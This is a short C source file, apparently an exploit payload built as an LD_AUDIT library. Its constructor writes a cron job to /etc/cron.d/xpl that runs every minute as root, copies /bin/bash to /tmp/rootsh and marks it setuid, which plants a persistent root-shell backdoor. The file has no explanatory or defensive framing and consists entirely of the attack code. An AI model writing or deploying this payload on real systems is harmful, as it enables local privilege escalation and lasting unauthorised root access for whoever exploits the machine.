#define _GNU_SOURCE
#include <link.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

unsigned int la_version(unsigned int version) {
    return LAV_CURRENT;
}

void __attribute__((constructor)) init() {
    FILE *f = fopen("/etc/cron.d/xpl", "w");
    if (f) {
        fprintf(f, "* * * * * root cp /bin/bash /tmp/rootsh; chmod +s /tmp/rootsh\n");
        fclose(f);
    }
}
